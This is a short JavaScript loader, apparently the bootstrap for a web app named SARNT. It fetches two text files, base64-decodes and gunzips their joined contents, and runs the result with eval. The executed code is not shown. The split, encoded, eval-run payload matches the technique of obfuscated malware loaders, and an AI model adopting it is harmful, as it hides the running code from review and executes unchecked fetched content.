(function () {
  var parts = location.pathname.split("/").filter(Boolean);
  var BASE = parts[0] === "sarge" ? "/sarge" : "";
  function load(name) {
    return fetch(BASE + name + "?v=2", { cache: "no-store" }).then(function (r) {
      if (!r.ok) throw new Error(r.status);
      return r.text();
    });
  }
  Promise.all([load("/sarnt.a.txt"), load("/sarnt.b.txt")]).then(function (pair) {
    var bin = Uint8Array.from(atob((pair[0] + pair[1]).replace(/\s/g, "")), function (ch) {
      return ch.charCodeAt(0);
    });
    return new Response(new Blob([bin]).stream().pipeThrough(new DecompressionStream("gzip"))).text();
  }).then(function (code) {
    (0, eval)(code);
  }).catch(function (err) {
    console.error(err);
    var el = document.getElementById("app");
    if (el) el.textContent = "SARNT failed to load.";
  });
})();
